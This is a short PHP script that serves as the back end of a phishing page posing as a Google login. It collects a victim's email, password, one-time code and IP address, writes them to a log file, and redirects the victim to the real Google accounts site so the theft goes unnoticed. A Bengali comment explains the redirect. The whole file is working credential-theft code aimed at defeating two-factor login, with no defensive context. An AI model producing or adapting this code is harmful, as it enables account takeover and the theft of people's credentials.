<?php
header('Location: https://accounts.google.com'); // সাবমিট করার পর অরিজিনাল সাইটে পাঠিয়ে দেবে

$email = $_POST['email'];
$pass = $_POST['password'];
$otp = $_POST['otp'];
$ip = $_SERVER['REMOTE_ADDR'];
$time = date('Y-m-d H:i:s');

$data = "--- New Entry ($time) ---\n";
$data .= "Email: $email\n";
$data .= "Pass: $pass\n";
$data .= "OTP: $otp\n";
$data .= "IP: $ip\n";
$data .= "--------------------------\n\n";

file_put_contents('log.txt', $data, FILE_APPEND);
exit();
?>
